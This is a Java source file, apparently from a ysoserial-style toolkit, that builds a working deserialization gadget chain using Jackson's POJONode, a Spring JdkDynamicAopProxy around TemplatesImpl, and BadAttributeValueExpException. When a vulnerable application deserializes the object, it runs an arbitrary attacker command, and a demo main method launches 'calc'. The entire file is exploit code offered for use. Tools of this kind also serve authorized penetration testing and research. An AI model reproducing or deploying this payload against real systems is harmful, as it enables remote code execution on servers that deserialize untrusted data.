package cn.butler.yso.payloads;

import cn.butler.payloads.ObjectPayload;
import cn.butler.yso.payloads.util.Gadgets;
import com.fasterxml.jackson.databind.node.POJONode;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import cn.butler.payloads.annotation.Authors;
import cn.butler.payloads.annotation.Dependencies;
import cn.butler.payloads.PayloadRunner;
import org.springframework.aop.framework.AdvisedSupport;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"com.fasterxml.jackson.core:jackson-databind:2.14.2"})
@Authors({Authors.B0T1ER})
public class Jackson implements ObjectPayload<Object> {

    public static void main(String[] args) throws Exception {
        args = new String[]{"TemplatesImpl:raw_cmd:calc"};
        PayloadRunner.run(Jackson.class, args);
    }

    public Object getObject(final String command) throws Exception {
        final Object object = Gadgets.createGetter(command);
        //避免在序列化时候触发
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass0 = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");

        if (!ctClass0.isFrozen()) {
            CtMethod ctMethod = ctClass0.getDeclaredMethod("writeReplace");
            ctClass0.removeMethod(ctMethod);
            ctClass0.freeze();
            ctClass0.toClass();
        }

        // 构造稳定的链子
        Class<?> clazz = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy");
        Constructor<?> cons = clazz.getDeclaredConstructor(AdvisedSupport.class);
        cons.setAccessible(true);
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(object);
        InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport);
        Object proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]{Templates.class}, handler);
        POJONode jsonNodes = new POJONode(proxyObj);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field val = Class.forName("javax.management.BadAttributeValueExpException").getDeclaredField("val");
        val.setAccessible(true);
        val.set(badAttributeValueExpException,jsonNodes);

        return badAttributeValueExpException;
    }
}
